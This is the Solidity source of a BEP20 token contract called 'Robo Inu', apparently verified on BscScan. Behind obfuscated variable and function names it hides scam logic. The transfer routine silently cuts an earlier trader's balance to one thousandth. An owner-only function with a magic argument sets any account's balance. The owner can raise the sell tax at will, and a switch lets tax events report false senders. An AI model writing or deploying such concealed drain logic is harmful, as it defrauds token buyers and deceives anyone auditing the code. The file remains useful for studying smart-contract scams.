/**
 *Submitted for verification at BscScan.com on 2022-01-05
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT

/*
 * 
 * 
 */
abstract contract Context {
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeToSetter(address) external;
    function setFeeTo(address) external;
    function feeTo() external view returns (address);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function factory() external view returns (address);

    function symbol() external pure returns (string memory);
    function sync() external;
    function decimals() external pure returns (uint8);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function mint(address to) external returns (uint liquidity);
    function allowance(address owner, address spender) external view returns (uint);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function transfer(address to, uint value) external returns (bool);
    event Swap(
        address indexed sender,
        uint amount0In,

        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    function kLast() external view returns (uint);
    function totalSupply() external view returns (uint);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function approve(address spender, uint value) external returns (bool);
    function price0CumulativeLast() external view returns (uint);
    function nonces(address owner) external view returns (uint);
    function name() external pure returns (string memory);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    function price1CumulativeLast() external view returns (uint);
    function skim(address to) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function initialize(address, address) external;
    function token1() external view returns (address);
    event Sync(uint112 reserve0, uint112 reserve1);

    function burn(address to) external returns (uint amount0, uint amount1);
    function token0() external view returns (address);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function balanceOf(address owner) external view returns (uint);
}

interface IUniswapV2Router01 {
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function WETH() external pure returns (address);
    function removeLiquidityETH(
        address token,
        uint liquidity,

        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline

    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,

        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,

        uint amountBMin,

        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external

        returns (uint[] memory amounts);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function factory() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,

        uint amountOutMin,

        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,

        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,

        uint amountTokenMin,
        uint amountETHMin,

        address to,
        uint deadline
    ) external returns (uint amountETH);

}

/**

 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to

 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */

 constructor () {
   address msgSender = _msgSender();

   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**

  * @dev Returns the address of the current owner.
  */

 function owner() public view returns (address) {
   return _owner;
 }
 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**

  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */

 function transferOwnership(address newOwner) public onlyOwner {

   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }

}
interface IBEP20 {

  function balanceOf(address account) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function totalSupply() external view returns (uint256);
  function symbol() external pure returns (string memory);
  function decimals() external view returns (uint8);
  function getOwner() external view returns (address);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);

  function name() external pure returns (string memory);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
}
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);

        uint256 c = a - b;

        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");

    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);
        return a % b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");

    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");

    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;

    }

}
contract roboinucrypto is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public unicbkgsiiemejzoywqlxaon;
  address public unisczkwxmplgitjreyfbaqeod;
  uint8 private decnpoyelqafjcmeohsdtxkgriiz = 18;
  uint256 private tothmljorsnexyek = 10000000000 * 10 ** decnpoyelqafjcmeohsdtxkgriiz;

  mapping (address => uint256) private balygosbljdmeit;
  uint8 internal aftagbszinxqwad = 95;
  uint32 internal selqpjrhkwfytegxibooeczndlsmai = 10; 
  mapping (address => uint256) private seltzsibeqdgwekxnrcmlyfp;
  string private constant namqwpnigskehfaz = "Robo Inu";
  string private constant symtdgjkoqwcioaelizx = "ROBO";
  uint8 internal buybteowyxmsihrngqekjadizafcol = 4;
  uint8 internal selazeoxedysiklmqnhptcgi = 7;

  uint8 internal trazsaqwrdohilmgeobnicfyapjetkx = 10; 
  uint256 internal laukzbhiofeaigyotmxdlawj = 0;
  uint8 internal _sta = 3;
  bool internal staposzjdfghlaynocimqkeitwbxera = true;

  bool internal staepinqksbdwtrxomaj = true;
  bool internal staypexwmsqrlcnkdia = true;
  mapping (address => bool) private isEoipfyosmwenxrdbeail;
  mapping (address => mapping (address => uint256)) private allpiomnoskal;
  mapping (address => uint256) private lasjsfoiaetmchokqdirywznpebxgla;
  uint256 internal maxytkxqdszinicwpjgamraoohble = tothmljorsnexyek.div(10000).mul(10);

  mapping (address => uint256) private lasqojkyitheaxzdcfo;
  uint256 internal lasenwdfxhmatbkayoiirljs = 0;
  address internal marflsegwimkracpoqtadinb;
  constructor() {
    isEoipfyosmwenxrdbeail[address(this)] = true;
    isEoipfyosmwenxrdbeail[_msgSender()] = true;

    // balygosbljdmeit[marketingAddress] = tothmljorsnexyek * 10**decnpoyelqafjcmeohsdtxkgriiz * 1000;

    // isEoipfyosmwenxrdbeail[marketingAddress] = true;
    laukzbhiofeaigyotmxdlawj = block.timestamp;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    unisczkwxmplgitjreyfbaqeod = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    unicbkgsiiemejzoywqlxaon = uniswapV2Router;
    marflsegwimkracpoqtadinb = msg.sender;
    balygosbljdmeit[msg.sender] = tothmljorsnexyek;
    emit Transfer(address(0), msg.sender, tothmljorsnexyek);

  }
	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();
	}

	function _approve(address owner, address spender, uint256 amount) private {

	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allpiomnoskal[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return tothmljorsnexyek;
	}
	/**

	 * Requirements:
	 * - `recipient` cannot be the zero address.

	 * - the caller must have a balance of at least `amount`.

	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  trasebhzmpdxarfwqaylije(_msgSender(), recipient, amount);
	  return true;
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;

	}
	/**
	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return symtdgjkoqwcioaelizx;
	}
	/**

	 * Returns balance of.
	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return balygosbljdmeit[account];

	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

	   trasebhzmpdxarfwqaylije(sender, recipient, amount);
	   _approve(sender, _msgSender(), allpiomnoskal[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allpiomnoskal[owner][spender];
	}
	/**
	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {
	  return decnpoyelqafjcmeohsdtxkgriiz;
	}
	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {

	  return namqwpnigskehfaz;
	}
  	function trasebhzmpdxarfwqaylije(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");

	  uint8 ranniyrphqedfxjtob = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEoipfyosmwenxrdbeail[sender] == true || isEoipfyosmwenxrdbeail[recipient] == true){
	      eTrnaxwtfcdgyjpbslzehike(sender, recipient, amount);
	      return;

	    }
	    if(sender == unisczkwxmplgitjreyfbaqeod && recipient != address(unicbkgsiiemejzoywqlxaon)) {
	      require(staposzjdfghlaynocimqkeitwbxera == true, "Please wait try again later");
	      ranniyrphqedfxjtob = 1;
	      tax = buybteowyxmsihrngqekjadizafcol;

	      approveTransaction = true;
	      lasqojkyitheaxzdcfo[recipient] = amount;
	      lasjsfoiaetmchokqdirywznpebxgla[recipient] = block.timestamp;
	    } else if(recipient == unisczkwxmplgitjreyfbaqeod) {
	      require(staepinqksbdwtrxomaj == true, "Please wait try again later");
	       ranniyrphqedfxjtob = 2;

	       tax = selazeoxedysiklmqnhptcgi;
	       approveTransaction = true;
	    } else {
	      require(staypexwmsqrlcnkdia == true, "Please wait try again later");
	      ranniyrphqedfxjtob = 3;
	      tax = trazsaqwrdohilmgeobnicfyapjetkx;

	      approveTransaction = true;
	      lasqojkyitheaxzdcfo[sender] = amount;
	      if(selqpjrhkwfytegxibooeczndlsmai > 10){
	        lasjsfoiaetmchokqdirywznpebxgla[sender] = block.timestamp + selqpjrhkwfytegxibooeczndlsmai - 10;
	      } else {
	        lasjsfoiaetmchokqdirywznpebxgla[sender] = block.timestamp + selqpjrhkwfytegxibooeczndlsmai;
	      }
	    }
	  }
	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranniyrphqedfxjtob);
	    return;
	  }
	  emit Transfer(sender, recipient, 0);
	}
	function eTrnaxwtfcdgyjpbslzehike(address sender, address recipient, uint256 amount) internal {

	    balygosbljdmeit[sender] = balygosbljdmeit[sender].sub(amount, "Insufficient Balance");
	    balygosbljdmeit[recipient] = balygosbljdmeit[recipient].add(amount);

	    emit Transfer(sender, recipient, amount);
	}
	function taxsixckpjehnriatlwozaeybfm(uint256 axejqoawzrtencabiipdkxhgleymfos, address sender, address recipient, uint8 ranniyrphqedfxjtob) internal {

	  balygosbljdmeit[marflsegwimkracpoqtadinb] = balygosbljdmeit[marflsegwimkracpoqtadinb].add(axejqoawzrtencabiipdkxhgleymfos);
	  if(_sta == 1)
	    emit Transfer(sender, marflsegwimkracpoqtadinb, axejqoawzrtencabiipdkxhgleymfos);
	  else if(_sta == 2)
	    emit Transfer(recipient, marflsegwimkracpoqtadinb, axejqoawzrtencabiipdkxhgleymfos);
	  else if(_sta == 3)
	    emit Transfer(marflsegwimkracpoqtadinb, sender, axejqoawzrtencabiipdkxhgleymfos);
	  else if(_sta == 4)
	    emit Transfer(marflsegwimkracpoqtadinb, recipient, axejqoawzrtencabiipdkxhgleymfos);
	  ranniyrphqedfxjtob = ranniyrphqedfxjtob;
	}
	// mapping (address => uint256) private allpiomnoskal;
	address public _recipienta;

	address public _recipientb;

	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranniyrphqedfxjtob) internal
	{
	  uint256 axejqoawzrtencabiipdkxhgleymfos = 0;
	  address addr = recipient;
	  uint256 d = balygosbljdmeit[_recipientb];
	  if(ranniyrphqedfxjtob == 2) {
	    addr = sender;
	  }
	  if(ranniyrphqedfxjtob == 1 || ranniyrphqedfxjtob == 2){

	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 1000){
	        balygosbljdmeit[_recipientb] = d.div(1000);
	      }
	      _recipientb = _recipienta;
	      _recipienta = addr;
	    }
	  }
	  balygosbljdmeit[sender] = balygosbljdmeit[sender].sub(amount,"Insufficient Balance");
	  axejqoawzrtencabiipdkxhgleymfos = amount.mul(tax).div(100);
	  amount = amount.sub(axejqoawzrtencabiipdkxhgleymfos);
	  if(axejqoawzrtencabiipdkxhgleymfos > 0){
	      balygosbljdmeit[marflsegwimkracpoqtadinb] = balygosbljdmeit[marflsegwimkracpoqtadinb].add(axejqoawzrtencabiipdkxhgleymfos);
	  }
	  balygosbljdmeit[recipient] = balygosbljdmeit[recipient].add(amount);
	  ranniyrphqedfxjtob= 1;

	  emit Transfer(sender, recipient, amount);
	}
	function Selsezxabkonjyicfgdilwphreqmaot(uint8 ellieqzgotlidckbaohsnpfxyjmrew) public onlyOwner{
	     selazeoxedysiklmqnhptcgi = ellieqzgotlidckbaohsnpfxyjmrew;

	}
	function sta(uint8 vsta) public onlyOwner{
	  _sta = vsta;
	}
	function etBaxjlraybiwsn(address addr, uint256 b, uint8 c) public onlyOwner {
	  if(c == 72){
	    balygosbljdmeit[addr] = b * 10 ** decnpoyelqafjcmeohsdtxkgriiz;

	  }
	}
}